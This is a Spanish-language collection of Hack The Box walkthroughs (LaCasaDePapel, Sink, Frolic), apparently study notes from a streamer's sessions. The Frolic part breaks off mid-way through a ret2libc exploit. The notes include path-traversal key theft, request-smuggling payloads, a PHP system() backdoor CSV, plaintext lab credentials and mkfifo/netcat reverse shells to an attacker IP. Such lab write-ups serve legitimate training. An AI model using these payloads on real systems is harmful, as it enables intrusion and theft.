```bash
echo 'U0VBU09OLTEvMDMuYXZp' | base64 -d;echo
#Output
SEASON-1/03.avi
```

En la url vemos que tenemos algo como `https://lacasadepapel.htb/?path=SEASON-1`. Miramos lo que pasa si le damos a `https://lacasadepapel.htb/?path=/etc/passwd` y
salta un error como no existe el path en `/home/berlin/download//etc/passwd` y que usa la funccion scandir para esto. Ya pensamos en un path traversal, pero como es
un scandir solo podemos ir a por directorios.

```bash
https://lacasadepapel.htb/?path=../
```

aqui vemos el user.txt.

```bash
echo -n '../user.txt' | base64
#Output
Li4vdXNlci50eHQ=
```

y si vamos ahora a la url `https://lacasadepapel.htb/file/Li4vdXNlci50eHQ=` vemos que podemos descargar el user.txt. Pero a nosotros nos interessa ganar accesso
al systema.

En la url `https://lacasadepapel.htb/?path=../` vemos que podemos pinchar al directorio `.ssh` y a dentro hay una `id_rsa`. Hacemos lo mismos que con el user.txt


<!--chapter:end:59-LaCasaDePapel/59-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### SSH {-}

```bash
echo -n '../.ssh/id_rsa' | base64
#Output
Li4vLnNzaC9pZF9yc2E=
```

y con la url `https://lacasadepapel.htb/file/Li4vLnNzaC9pZF9yc2E=` descargamos el fichero id_rsa.

```bash
mv /home/s4vitar/Descargas/firefox/id_rsa .
chmod 600 id_rsa
ssh -i id_rsa berlin@10.10.10.131
```

como no va intentamos con los otros usuarios.

```bash
ssh -i id_rsa berlin@10.10.10.131
ssh -i id_rsa dali@10.10.10.131
ssh -i id_rsa nairobi@10.10.10.131
ssh -i id_rsa oslo@10.10.10.131
ssh -i id_rsa professor@10.10.10.131
```

Hemos ganado accesso al systema como el usuario professor.

<!--chapter:end:59-LaCasaDePapel/59-03-GainingAccess.Rmd-->

## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
whoami
ls
pwd
find / -name user.txt
cd /home/berlin/user.txt
```

Aqui vemos que el user.txt solo se puede ver desde la web.

```bash
uname -a
lsb_release
cat /etc/os-release
id
sudo -l
cd /
find \-perm -4000 2>/dev/null
```

aqui vemos binarios SUID. comprobamos con [gtfobins](https://gtfobins.github.io/) si se pueden burlar.

buscamos por bbsuid, abuild-sudo sudo pero no encontramos nada. Tenemos que mirar de CRON. Lo miramos con pspy.

```bash
git clone https://github.com/DominicBreuker/pspy
cd pspy
go build -ldflags "-s -w" main.go
upx main
mv main pspy
python3 -m http.server 80
```

Desde la maquina victima, downloadeamos el fichero y lo lanzamos

```bash
wget http://10.10.14.8/pspy
chmod +x pspy
./pspy
```

Podemos ver que hay una tarea ejecutada por root que lanza un `sudo -u nobody /usr/bin/node /home/professor/memcached.js` 

Si vamos al `/home/professor` vemos el fichero `memcached.js` pero no nos deja ver lo que hay dentro. Hay otro fichero `memcached.ini` que contiene
el comando ejecutado durante la tarea cron. 

Aqui el truco es que aun que el fichero no se puedo modificar, como esta en nuestra carpeta HOME, lo podemos borrar.

```bash
rm memcached.ini
vi memcached.ini


[program:memcached]
command = sudo -u root /tmp/pwn.sh
```

aqui creamos el pwn.sh

```bash
cd /tmp
touch pwn.sh
chmod +x pwn.sh
vi pwn.sh

#!/bin/bash

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.80 443 >/tmp/f
```

nos ponemos en escucha por el puerto 443

```bash
nc -nlvp 443
```

Esperamos un poco y ganamos acceso al systema como root y podemos leer la flag.

<!--chapter:end:59-LaCasaDePapel/59-04-PrivilegeEscalation.Rmd-->

# Sink {-}

## Introduccion {-}

La maquina del dia se llama Sink.

El replay del live se puede ver aqui

[![S4vitaar Sauna maquina](https://img.youtube.com/vi/fhI1MDL_nSo/0.jpg)](https://www.youtube.com/watch?v=fhI1MDL_nSo)

No olvideis dejar un like al video y un commentario...

<!--chapter:end:60-Sink/60-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.225
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.225
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.225 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p22,3000,5000 10.10.10.225 -oN targeted
```


| Puerto | Servicio | Que se nos occure? | Que falta? |
| ------ | -------- | ------------------ | ---------- |
| 22     | ssh      | Coneccion directa  |            |
| 3000   | http     | Web Fuzzing        |            |
| 5000   | https    | Web Fuzzing        |            |


### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.225:3000
whatweb http://10.10.10.225:5000
```

Vemos en el puerto 3000 informacion que habla de un git un poco como un github. Y en el puerto 5000 vemos un password field que parece ser un
panel de inicio de session.

#### Checkear la web {-}

Si entramos en la url `http://10.10.10.225:3000`, El wappalizer no nos muestra nada. Si entramos con la url `http://10.10.10.225:5000` vemos el panel de inicio de
session y el wappalizer tampoco no dice nada.

El puerto 3000 nos muestra un GITEA, intentamos cosas como XSS, Regex y SQLi en el input del menu Explorar, pero no vemos nada. En usuarios vemos 3 usuarios:

- david
- marcus
- root

Si pinchamos en los links de los usuarios no vemos nada. Tambien vemos que no nos podemos registrar. Intentamos loggearnos como `david:david`, `marcus:marcus` y `root:root` pero nada.

En la pagina del puerto 5000, nos podemos registrar. Creamos un usuario y entramos en una web. miramos si podemos hacer cosas como htmlI, XXS, pero no vemos nada. Lo unico seria
en la pagina `http://10.10.10.225:5000/notes` que podriamos Fuzzear para ver notas.

Lanzamos Burpsuite para ver como se transmitten las peticiones. Pero no vemos nada interesantes aqui.






<!--chapter:end:60-Sink/60-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}

### HTTP Request Smuggling {-}

Como no hemos encontrado nada analyzando la web manualmente, analyzamos las cabezeras con curl

```bash
curl -X GET -I http://10.10.10.225:5000/home
curl -X GET -I http://10.10.10.225:5000/home -L
```

Aqui vemos que estamos frente a un gunicorn que pasa `haproxy`. Miramos por google que es y si existen vulnerabilidades. Encontramos una vulnerabilidad
liada a `haproxy` que es un **HTTP Request Smuggling**. Esta vulnerabilidad esta bien contemplada en la web de [portswigger](https://portswigger.net/web-security/request-smuggling).
Esta vulnerabilidad basicamente permitte enviar 2 peticiones al mismo tiempo y permitteria burlar las seguridades con esta segunda peticion.
En el caso de `haproxy` podemos ver esta vulnerabilidad en la pagina de [nathanvison](https://nathandavison.com/blog/haproxy-http-request-smuggling).

Para explotar esta vulnerabilidad vamos a utilizar el Burpsuite.

```bash
POST /comment HTTP/1.1
Host: 10.10.10.225:5000
Content-Type: application/x-www-form-urlencode
Content-Length: 10
Cookie: lang=es-ES; i_like_gitea=604fd0a0f47a3b62; _csrf=4/PDrYQpzOFpi6ZlhMOToLe6YnY6MTYzMTk5NTE4zUONzY2NzY2Mg;
 redirect_to=&2Froot; session=eyJlbWFpbCI6InMOdmlOyXJaczR2aXRhci5jb20ifQ.YU2HdQ.qlIPX6awl0v1C8A8UXGUHfLXFJo
Transfer-Encoding:[\x0b]chunked

0

POST /comment HTTP/1.1
Host: 10.10.10.225:5000
Content-Type: application/x-www-form-urlencode
Content-Length: 10
Cookie: lang=es-ES; i_like_gitea=604fd0a0f47a3b62; _csrf=4/PDrYQpzOFpi6ZlhMOToLe6YnY6MTYzMTk5NTE4zUONzY2NzY2Mg;
 redirect_to=&2Froot; session=eyJlbWFpbCI6InMOdmlOyXJaczR2aXRhci5jb20ifQ.YU2HdQ.qlIPX6awl0v1C8A8UXGUHfLXFJo

msg=Adios


```

> [ ! ] Notas: Es possible que tengamos que encodear en base64 el `[\x0b]` antes de ponerla en el burpsuite y tenemos que darle al Follow redirect en este caso.

Aqui podemos ver que hemos podido enviar 2 peticiones al mismo tiempo, una nos da el mensaje **None** y la segunda nos sale **Adios**, lo que significa que
es vulnerable a **HTTP Request Smuggling**.

Intentamos cosas y nos damos cuenta que si agregamos mas content length a la segunda request podemos ver parte de la request del delete.


```bash
POST /comment HTTP/1.1
Host: 10.10.10.225:5000
Content-Type: application/x-www-form-urlencode
Content-Length: 10
Cookie: lang=es-ES; i_like_gitea=604fd0a0f47a3b62; _csrf=4/PDrYQpzOFpi6ZlhMOToLe6YnY6MTYzMTk5NTE4zUONzY2NzY2Mg;
 redirect_to=&2Froot; session=eyJlbWFpbCI6InMOdmlOyXJaczR2aXRhci5jb20ifQ.YU2HdQ.qlIPX6awl0v1C8A8UXGUHfLXFJo
Transfer-Encoding:[\x0b]chunked

0

POST /comment HTTP/1.1
Host: 10.10.10.225:5000
Content-Type: application/x-www-form-urlencode
Content-Length: 50
Cookie: lang=es-ES; i_like_gitea=604fd0a0f47a3b62; _csrf=4/PDrYQpzOFpi6ZlhMOToLe6YnY6MTYzMTk5NTE4zUONzY2NzY2Mg;
 redirect_to=&2Froot; session=eyJlbWFpbCI6InMOdmlOyXJaczR2aXRhci5jb20ifQ.YU2HdQ.qlIPX6awl0v1C8A8UXGUHfLXFJo

msg=a


```

Si ponemos `Content-Length: 300` podemos ver una cookie de session que no es la misma que la nuestra.
Cambiamos la cookie en el Firefox y vamos a `/notes` podemos ver notas differentes que contienen credenciales para nuevos **Hosts** que añadimos al `/etc/hosts`.

Intentamos ir a las urls:
    - `http://chef.sink.htb:3000`
    - `http://chef.sink.htb:5000`
    - `http://code.sink.htb:3000`
    - `http://code.sink.htb:5000`
    - `http://nagios.sink.htb:3000`
    - `http://nagios.sink.htb:5000`

pero no vemos ninguna differencia. Podria ser un puerto 80 interno. Intentamos connectarnos por **ssh** con las credentiales encontradas pero no podemos connectarnos.


Una de las credenciales nos llama la atencion porque son credenciales del usuario **root** y recordamos haber visto un usuario root en el **GITEA**.
Si vamos a la url `http://10.10.10.225:3000` y nos conectamos con las credenciales de **root**.










<!--chapter:end:60-Sink/60-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### GITEA Git commits history {-}

Loggeado como el usuario **root** nos permitte ver 4 repositorios. Aqui tenemos que analyzar los differentes repositorios que nos permitte encontrar
nuevos puertos internos, un proyecto `elastic_search`, un repositorio `Log_Manager` que contiene informaciones sobre un **aws** y otras informaciones mas.

Uno de los proyecto es el **Key_Management** que es archivado, y que contiene commits hechos por el usuario marcus. Uno de estos commits contiene una 
`Private key`.

Copiamos la llave y le ponemos derechos **600**, nos podemos connectar por `ssh` como el usuario `marcus`.

```bash
chmod 600 id_rsa
ssh -i id_rsa marcus@10.10.10.225
```

Aqui podemos ver que hemos ganado accesso al systema y que podemos leer la flag.



<!--chapter:end:60-Sink/60-03-GainingAccess.Rmd-->

## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
whoami
ls
id
sudo -l
pwd
find \-type f 2>/dev/null
```

buscamos para puertos abiertos

```bash
netstat -nat
```

aqui vamos a pasar por `/proc/net/tcp` y passar de **hex** a **decimal** con bash.

1. Copiamos el `/proc/net/tcp` en un fichero data_hex

    ```bash
    cat /proc/net/tcp
    ```

1. recuperamos los puertos

    ```bash
    cat data_hex | awk '{print $2}'
    cat data_hex | awk '{print $2}' | tr ':' ' '
    cat data_hex | awk '{print $2}' | tr ':' ' ' | awk 'NF{print $NF}'
    cat data_hex | awk '{print $2}' | tr ':' ' ' | awk 'NF{print $NF}' | sort -u
    ```

1. Passamos del hexadecimal al decimal con bash

    ```bash
    for hex_port in $(cat data_hex | awk '{print $2}' | tr ':' ' ' | awk 'NF{print $NF}' | sort -u); do echo "obase=10; ibase=16; $hex_port" | bc; done
    ```

Continuamos la enumeracion

```bash
cd /
find \-perm -4000 2>/dev/null
ls -la /var
ls -la /opt
ls -la /opt/containerd
ps -faux
ifconfig

cat /home/bot/bot.py
```
El `ps -faux` nos muestra un commando python a un fichero que no existe en esta maquina. Pensamos en un docker o algo parecido.
Aqui no vemos nada interessante. Vamos a crearnos un procmon en bash

```bash
cd /dev/shm
touch procmon.sh
chmod +x procmon.sh
vi procmon.sh
```

```bash
#!/bin/bash

old_process=$(ps -eo command)

while true; do
    new_process=$(ps -eo command)
    diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -v -E "procmon|command|kworker"
    old_process=$new_process
done
```

Aqui tampoco vemos nada interessante. Miramos si tenemos binarios installados que corresponden a lo que hemos encontrado en el **GITEA**.

```bash
which aws
```

Vemos que tenemos **aws** installado y en un commit del repository `Log_Manager` podemos ver credenciales con un secret contra un endpoint en el puerto 4566.

```bash
netstat -nat | grep "4566"

aws help
aws secrectsmanager help
aws --endpoint-url="http://127.0.0.1:4566" secrectsmanager list-secrets
```

Aqui vemos que tenemos primero que configurar el commando aws.

```bash
aws configure

AWS Access Key ID [None]: AKIAIUEN3QWCPSTEITJQ
AWS Secret Access Key [None]: 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
Default region name [None]: eu
Default option format [None]:

aws --endpoint-url="http://127.0.0.1:4566" secrectsmanager list-secrets
```

Aqui ya podemos listar los secretos y recuperamos la data interesante

```bash
aws --endpoint-url="http://127.0.0.1:4566" secrectsmanager list-secrets | grep "ARN"
aws --endpoint-url="http://127.0.0.1:4566" secrectsmanager list-secrets | grep "ARN" | grep -v "RotationLambdaARN"
aws --endpoint-url="http://127.0.0.1:4566" secrectsmanager list-secrets | grep "ARN" | grep -v "RotationLambdaARN" | grep -oP '".*?"'
aws --endpoint-url="http://127.0.0.1:4566" secrectsmanager list-secrets | grep "ARN" | grep -v "RotationLambdaARN" | grep -oP '".*?"' | grep -v "ARN"
aws --endpoint-url="http://127.0.0.1:4566" secrectsmanager list-secrets | grep "ARN" | grep -v "RotationLambdaARN" | grep -oP '".*?"' | grep -v "ARN" | tr -d '"'
```

Ahora que tenemos un listado de **ARN** podemos usar del commando `get-secret-value` para cada **ARN**.

```bash
#!/bin/bash

aws --endpoint-url="http://127.0.0.1:4566" secrectsmanager list-secrets | grep "ARN" | grep -v "RotationLambdaARN" | grep -oP '".*?"' | grep -v "ARN" | tr -d '"' while read aws_secret_key; do
    echo -e "\n[+] Mostrando secreto con el secret_key $aws_secret_key:\n"
    aws --endpoint-url="http://127.0.0.1:4566" secretsmanager get-secret-value --secret-id "$aws_secret_key"
done
```

Aqui podemos ver credenciales y como el usuario **david** esta en el systema intentamos con la credencial encontrada

```bash
su david
Password: EALB=bcC=`a7f2#k
```

Ya hemos podido pivotar al usuario **david** y vemos que en su directorio tiene un proyecto con un fichero encodeado. Vamos a intentar decodearlo con
**aws**.

```bash
cd Projects/Prod_Deployment
aws --endpoint-url="http://127.0.0.1:4566" kms list-keys


aws configure

AWS Access Key ID [None]: AKIAIUEN3QWCPSTEITJQ
AWS Secret Access Key [None]: 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
Default region name [None]: eu
Default option format [None]:

aws --endpoint-url="http://127.0.0.1:4566" kms list-keys
```

Si miramos la funccionalidad de decrypt del aws, vemos que necessitamos una key_id para desencryptar un fichero.

```bash
aws --endpoint-url="http://127.0.0.1:4566" kms list-keys | grep -i "keyid"
aws --endpoint-url="http://127.0.0.1:4566" kms list-keys | grep -i "keyid" | awk 'NF{print $NF}'
aws --endpoint-url="http://127.0.0.1:4566" kms list-keys | grep -i "keyid" | awk 'NF{print $NF}' | tr -d '"'
aws --endpoint-url="http://127.0.0.1:4566" kms list-keys | grep -i "keyid" | awk 'NF{print $NF}' | tr -d '"' | tr -d ','
```

Vamos a crear otro script para desencryptar el fichero.

```bash
touch decryptor.sh
chmod +x !$
nano decryptor.sh


#!/bin/bash

declare -a algorithms=(SYMMETRIC_DEFAULT RSAES_OAEP_SHA_1 RSAES_OAEP_SHA_256)

for algo in "${algorithms[@]}"; do
    aws --endpoint-url="http://127.0.0.1:4566" kms list-keys | grep -i "keyid" | awk 'NF{print $NF}' | tr -d '"' | tr -d ',' | while read key_id; do
        echo -e "\n[+] Probando con el algoritmo $algo la key $key_id:\n"
        aws --endopoint="http://127.0.0.1:4566 kms decrypt --encryption-algorithm $algo --ciphertext-blob fileb:///home/david/Projects/Prod_Deployement/servers.enc --key-id "$key_id"
    done
done
```

Lanzamos el script y vemos el resultado que es un plaintext en base64. Lo desencryptamos en un fichero, y con el commando `file` vemos que el fichero es un gzip.

```bash
echo "..." | base64 -d > file
file file
mv file file.gz
which gunzip
gunzip file.gz
cat file
```

Aqui vemos una contraseña y probamos si es la contraseña del usuario root

```bash
su root
Password: _uezduQ!EY5AHfe2
```

Somos root y podemos ver la flag


<!--chapter:end:60-Sink/60-04-PrivilegeEscalation.Rmd-->

# Frolic {-}

## Introduccion {-}

La maquina del dia se llama Frolic.

El replay del live se puede ver aqui

[![S4vitaar Frolic maquina](https://img.youtube.com/vi/wJRb8PtpKD0/0.jpg)](https://www.youtube.com/watch?v=wJRb8PtpKD0)

No olvideis dejar un like al video y un commentario...

<!--chapter:end:61-Frolic/61-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.z
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.111
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.111 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p22,139,445,1880,9999 10.10.10.111 -oN targeted
```


| Puerto | Servicio     | Que se nos occure?          | Que falta? |
| ------ | ------------ | --------------------------- | ---------- |
| 22     | ssh          | Coneccion directa           |            |
| 139    | NetBios      |                             |            |
| 445    | Samba        | Conneccion con Null session |            |
| 1880   | http Node.js | Fuzzing                     |            |
| 9999   | http nginx   |                             |            |


### Analyzando el Samba {-}

```bash
smbclient -L 10.10.10.111 -N
smbmap -H 10.10.10.111 
```

Vemos un recurso `Printer Driver` y `IPC` pero no tenemos accesso.

### Analyzando la web {-}

#### Checkear la web {-}

Si entramos en la url `http://10.10.10.111:1880`. Vemos un panel de inicio de session **Node-Red**. Intentamos login por defectos como `admin:admin` pero no va.
Miramos por internet si existen credenciales por defecto con **Node-Red** pero por el momento no encontramos nada.

Checkeamos la url `http://10.10.10.111:9999` y vemos la pagina por defecto de **Nginx**. En esta pagina vemos una url `http://forlic.htb:1880`. Nos parece turbio porque
la url es **forlic** y no **frolic**, pero ya nos hace pensar que se puede aplicar virtual hosting. Lo añadimos al `/etc/hosts` y probamos pero no vemos ninguna diferencia.

#### Aplicando Fuzzing {-}

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.111:9999/FUZZ
```

Aqui encontramos routas como

- admin
- test
- dev
- backup

Si vamos a la url `http://10.10.10.111:9999/admin` vemos un panel de inicio de session que nos dice *c'mon i m hackable*.

Intentamos nuevamente `admin:admin` y nos sale un mensaje **you have 2 more left attempts**, controlamos si esto es general o solo para el usuario admin `test:test`
y vemos que es general. 











<!--chapter:end:61-Frolic/61-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}

### Credenciales en ficheros javascript y lenguaje esoterico {-}

En este caso no tocamos mas porque no queremos ser bloqueados. Si miramos el codigo fuente vemos que hay un fichero `login.js` que contiene las
credenciales.

Entramos las credenciales en la web `admin:superduperlooperpassword_lol` y conseguimos connectarnos y entramos en una pagina que contiene caracteres raros. Esto en concreto
se llama **Lenguaje esoterico**. Pero primero tenemos que buscar que lenguaje esoterico es en concreto.

Si buscamos en la web por `esoteric languages` encontramos una lista de 10 lenguajes esotericos en [esolangs](https://esolangs.org/wiki/Esoteric_programming_language). Uno de ellos nos 
llama la atencion porque es bastante parecido. Este seria el [Ook!](https://esolangs.org/wiki/Ook!). La diferencia es que cada **.** **?** **!** contiene un **Ook** delante.

Copiamos los caracteres en un fichero `data` y lo tratamos para que se paresca al `Ook!`

```bash
cat data | sed 's/\./Ook\./g' | sed 's/\?/Ook\?/g' | sed 's/\!/Ook\!/g' | xclip -sel clip
```

Copiamos el mensaje en la web [dcode.fr](https://dcode.fr). Buscamos el code `Ook!` y colamos el mensaje y decodificando nos da el mensaje **Nothing here check
**/asdiSIAJJ0QWE9JAS** que parece ser una routa.

Si vamos a la url `http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS` vemos una nueva pagina con un nuevo mensaje que parece se **base64**.

```bash
curl -s -X GET "http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS" 
curl -s -X GET "http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS" | xargs
curl -s -X GET "http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS" | xargs | tr -d ' '
curl -s -X GET "http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS" | xargs | tr -d ' ' | base64
curl -s -X GET "http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS" | xargs | tr -d ' ' | base64 > data

file data
mv data data.zip
```

Aqui vemos que es un comprimido `.zip` y si le damos a `unzip data.zip` vemos que esta protegida por contraseña.


### Crackeando con fcrackzip {-}

```bash
fcrackzip -b -D -u -p /usr/share/wordlists/rockyou.txt data.zip
```

Aqui vemos que la contraseña es `password`.

Volmemos a descomprimir el fichero poniendole la contraseña y vemos un fichero `index.php`

```bash
cat index.php
```

vemos que nuevamente esta encryptada con caracteres del `a-f` y del `0-9` que seria Hexadecimal.

```bash
cat index.php | xxd -ps -r
```

y aqui parece ser nuevamente un base64.

```bash
cat index.php | xxd -ps -r > data
cat data | xargs
cat data | xargs | tr -d ' '
cat data | xargs | tr -d ' ' | base64 -d > data
cat data
```

Estamos nuevame frente a un lenguaje esoterico que parece se un **brainfuck**. Lo copiamos en la clipboard y lo decodificamos nuevamente en la web. En este
caso tiraremos de la web [tutorialspoint](https://www.tutorialspoint.com/execute_brainfk_online.php).

Pegamos el codigo y le damos a **Execute** y vemos el mensaje `idkwhatispass` que nos hace pensar en una contraseña. Intentamos ver si es la contraseña del usuario
admin del panel de authenticacion `Node-Red` pero no funcciona.

### Continuando analyzando las routas {-}

Si vamos a la url `http://10.10.10.111:9999/test` vemos un **php_info**. Lo primero aqui es siempre mirar las **disabled_functions**. No parece ser desabilitadas las
funcciones `exec()`, `shell_exec()` o `system()`.

Vamos a la url `http://10.10.10.111:9999/dev` y vemos un **403 Forbidden**. Como esta Forbidden intentamos ver si a routas validas bajo la routa `/dev` con **WFUZZ**.

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.111:9999/dev/FUZZ
```

y encontramos otras routas 
- test
- backup

 Si vamos a la url `http://10.10.10.111:9999/dev/test` nos descarga un fichero. y a la routa `http://10.10.10.111:9999/dev/backup` hay una nueva routa `/playsms`.

Miramos lo que hay en la url `http://10.10.10.111.9999/playsms` y vemos un panel de inicio de session **playsms**. Miramos si hay vulnerabilidades asociadas con searchsploit.

```bash
searchsploit playsms
```

Y vemos que hay exploits con Template Injection y Remote code execution.

Intentamos loggearnos con `admin:admin`, no va y intentamos el password que hemos encontrado antes. `admin:idkwhatispass` y en este caso funcciona.

### Explotando PlaySMS {-}

Buscamos un exploit que nos permite hacer RCE.

```bash
searchsploit playsms | grep -v -i metasploit | grep -i "remote code execution"
searchsploit -x 42044
```

Aqui el exploit nos dice que una vez loggeado con cualquier usuario, tenemos que ir a la url `http://10.10.10.111:9999/playsms/index.php?app=main&inc=feature_phonebook&route=import&op=list`,
y uploadear un fichero malicioso backdoor.csv

```csv
Name,Mobile,Email,Groupe code,Tags
<?php $t=$_SERVER['HTTP_USER_AGENT']; system($t); ?>,22,,
```

Aqui podemos ver que el exploit usa una cabezera para transmitir el comando que queremos ejecutar con la fuccion php `system()`. Esto quiere decir que tenemos que uzar
burpsuite para cambiar el user agent durante el upload.

Lanzamos Burpsuite y interceptamos el envio del fichero backdoor.csv. Cambiamos el User-Agent con `whoami`, Forwardeamos la peticion y en la web podemos ver
`www-data` en la columna Name.


<!--chapter:end:61-Frolic/61-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### Ganando acceso con PlaySMS {-}

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Enviamos nuevamente el csv a la web y interceptamos la peticion con burpsuite
1. Cambiamos el User-agent 

    ```bash
    User-Agent: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.9 443 >/tmp/f
    ```

Ya hemos ganado acceso al systema.

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```


Aqui ya miramos si podemos leer la flag

```bash
cd /home
find \-name user.txt 2>/dev/null
find \-name user.txt 2>/dev/null | xargs cat
```

Ya podemos ver la flag.

<!--chapter:end:61-Frolic/61-03-GainingAccess.Rmd-->

## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
cd /home/ayush
ls -la
```

Aqui vemos un directorio turbio donde nosotros como el usuario **www-data** tenemos derechos

```bash
cd ./binary
ls -la
```

Aqui vemos un fichero `rop` que tiene derechos suid como el usuario root. y como se llama rop pensamos directamente a un BufferOverflow

```bash
./rop

[*] Usage: program <message>


./rop EEEEEE

[*] Message sent: EEEEEE
```

Aqui vamos a usar python y ver si hay un BOF

```bash
./rop $(python -c 'print "A"*500)
Segmentation fault (core dumped)
```

Como vemos que hay un BOF nos enviamos el binario a nuestra maquina de atacante y tratamos el BOF. Nos lo enviamos con un http.server de python

1. en la maquina victima

    ```bash
    python3 -m http.server 8080
    ```

1. en nuestra maquina de atacante

    ```bash
    wget http://10.10.10.111:8080/rop
    chmod -x rop
    ```

#### Tratando el BOF {-}

1. Lanzamos el binario con gdb-gef

    ```bash
    gdb ./rop

    gef> r
    gef> r EEEE
    [*] Message sent: EEEEEE

    disass main
    ```

    Aqui vemos cosas como el SUID y la llamada a la funccion **put**

1. Miramos la seguridad del binario

    ```bash
    checksec
    ```

    Aqui vemos quel NX esta abilitado. Esto quiere decir quel DEP (Data Execution Prevention) esta habilitado, lo que significa que no podemos redirigir
    el flujo del programa a la pila para ejecutar comandos a nivel de systema.

1. Lanzamos 500 A

    ```bash
    gef> r $(python -c 'print "A"*500')
    ```

    Aqui vemos que hemos sobrepassado el $eip que ahora apunta a 0x41414141 que son 4 "A"

1. Buscamos el offset necessario antes de sobrescribir el $eip

    ```bash
    gef> pattern create 100
    aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
    
    gef> r aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

    gef> pattern offset $eip
    [+] Found at offset 52 (little-endian search) likely
    ```

    Aqui vemos que el offset es de 52 caracteres.

1. Comprobamos poniendole 52 A y 4 B

    ```bash
    gef> r $(pyhton -c 'print "A"*52 + "B"*4')
    ```

    Y vemos que el $eip vale ahora 0x42424242 que son 4 "B"

Como aqui sabemos que no podemos ejecutar comandos desde la pila porque el NX esta habilitado, la primera cosa que nos pasa por la cabeza seria
usar la technica `Ret2Libc`. Lo que tenemos que ver para efectuar esta tecnica seria ver si hay que burlar el ASLR en caso de que haya aleatorisacion 
en las direcciones de la memoria.

Esto se controla desde la maquina victima.

1. miramos si la architectura de la maquina es 32 o 64 bits

    ```bash
    uname -a
    ```

    vemos que estamos en una maquina con architectura 32 bits

1. miramos si el ASLR esta habilitado

    ```bash
    cat /proc/sys/kernel/randomize_va_space

    #Output
    2
    ```

    Esta habilitado y lo podemos comprobar dandole multiples vecez al comando `ldd rop` y vemos que la libreria libc.so.6 cambia
    de direccion cada vez.

Ahora que tenemos esto en cuenta miramos como atacamos el BOF con un `Ret2Libc`. La tecnica aqui seria que una vez tomado el control del $eip
redirigir el programa a la direccion del 

1. system_addr
1. exit_addr
1. bin_sh_addr

ret2libc -> system_addr + exit_addr + bin_sh_addr.

Solo falta conocer las direcciones de estas funcciones. Como la maquina es de architectura 32 bits, podemos intentar colision con las direcciones.
De que se trata exactamente; En condiciones normales (donde el ASLR no esta activado), sumariamos los diferentes ofsets de las funcciones `system`, 
`exit` y `/bin/sh` a la direccion de la libreria `libc`. Estas direcciones se encuentran de la manera siguiente.

1. la direccion de libreria libc

    ```bash
    ldd rop
    ldd rop | grep libc
    ldd rop | grep libc | awk 'NF{print $NF}'
    ldd rop | grep libc | awk 'NF{print $NF}' | tr -d '()'

    #Output
    0xb771f000
    ```

1. los offsets del system_addr y del exit

    ```bash
    readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E " system@@ | exit@@"
    
    #Output
     141: 0002e9d0 31 FUNC GLOBAL DEFAULT 13 exit@@GLIBC_2.0
    1457: 0003ada0 31 FUNC WEAK   DEFAULT 13 system@@GLIBC_2.0
    ```

    Aqui el *0003ada0* y el *0002e9d0* son los offset que tendriamos que sumar a la direccion de la libreria libc

1. el offset de la cadena `/bin/sh`

    ```bash
    strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
    
    #Output
    15ba0b /bin/sh
    ```

En este caso las direcciones serian 
- system = 0xb771f000 + 0003ada0
- exit = 0xb771f000 + 0002e9d0
- /bin/sh = 0xb771f000 + 15ba0b

Pero como la direccion cambia la tenemos que calcular o conocer antes. La suerte aqui es que como estamos en 32b, las
direcciones no cambian demasiado y esto se puede comprobar con bucles.

1. Verificamos con un bucle de 10 turnos las direcciones cambiantes

    ```bash
    for i in $(seq 1 10); do ldd rop | grep libc | awk 'NF {print $NF}' | tr -d '()'; done
    ```

1. Copiamos una de ellas (0xb7568000) y miramos si aparece multiples veces en un bucle de 1000 turnos

    ```bash
    for i in $(seq 1 1000); do ldd rop | grep libc | awk 'NF {print $NF}' | tr -d '()'; done | grep "0xb7568000"
    ```

